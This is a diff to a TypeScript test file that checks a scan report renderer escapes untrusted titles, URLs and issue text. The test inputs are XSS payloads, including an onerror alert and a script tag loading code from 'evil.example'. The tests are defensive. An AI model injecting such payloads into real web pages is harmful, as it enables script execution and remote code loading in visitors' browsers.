@@ -1,3 +1,4 @@
+import * as cheerio from 'cheerio';
 import { describe, expect, it } from 'vitest';
 import { parseScanReport, renderVisualReport } from '../visual-report.js';
 import { parseHtml, scanDocument, scan, SCORING_VERSION } from '../scanner.js';
@@ -8,6 +9,10 @@ function fixture(html = '<h1>Example</h1><p>A definition is an explanation of a 
   return { pages: [page], overall: page.scores, timestamp: '2026-09-09T00:00:00Z', summary: 'Fixture' };
 }
 
+function parseReportHtml(html: string): cheerio.CheerioAPI {
+  return cheerio.load(html);
+}
+
 describe('visual report', () => {
   it('preserves every readiness dimension and the exact original total', () => {
     const report = fixture();
@@ -16,7 +21,7 @@ describe('visual report', () => {
     for (const label of ['Structure', 'Citability', 'Schema', 'AI Metadata', 'Content Density']) {
       expect(html).toContain(`aria-label="${label}"`);
     }
-    expect(html.match(/<meter /g)).toHaveLength(5);
+    expect(parseReportHtml(html)('meter')).toHaveLength(5);
     expect(html).toContain('Page score distribution');
     expect(html).toContain('Findings by severity');
     expect(html).toContain('Not measured');
@@ -24,17 +29,19 @@ describe('visual report', () => {
 
   it('escapes source titles, issues, URLs and remediation without executing source markup', () => {
     const report = fixture();
-    const attack = '</script><img src=x onerror=alert(1)>';
+    const attack = '</ScRiPt><ImG sRc=x OnErRoR=alert(1)><SCRIPT SRC="https://evil.example/payload.js"></SCRIPT>';
     report.pages[0].title = attack;
     report.pages[0].url = attack;
     report.pages[0].issues.push({ message: attack, selector: attack, severity: 'warning', dimension: 'structure' });
     report.pages[0].suggestions.push({ action: attack, detail: attack, dimension: 'structure', impact: 'high' });
     const html = renderVisualReport(report);
+    const $ = parseReportHtml(html);
     expect(html).not.toContain(attack);
-    expect(html).toContain('&lt;/script&gt;&lt;img');
-    expect(html.match(/<script>/g)).toHaveLength(1);
+    expect($('#page-rows strong').first().text()).toBe(attack);
+    expect($('script')).toHaveLength(1);
+    expect($('script[src]')).toHaveLength(0);
+    expect($('img')).toHaveLength(0);
     expect(html).toContain("default-src 'none'");
-    expect(html).not.toMatch(/<script[^>]+src=/);
   });
 
   it('shows empty scans as unavailable rather than a measured zero', () => {
@@ -92,9 +99,11 @@ describe('interactive readiness details', () => {
     expect(html).toContain('llms-txt-presence');
     expect(html).toContain('id="source-comparisons"');
     expect(html).toContain('provided-html');
-    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');
-    expect(html).not.toContain('<img src=x');
-    expect(html.match(/<script>/g)).toHaveLength(1);
+    const $ = parseReportHtml(html);
+    expect($('code').filter((_, element) => $(element).text().includes('<img src=x onerror=alert(1)>'))).toHaveLength(1);
+    expect($('img')).toHaveLength(0);
+    expect($('script')).toHaveLength(1);
+    expect($('script[src]')).toHaveLength(0);
   });
 
   it('withholds unversioned baseline deltas and marks missing raw rule evidence', () => {
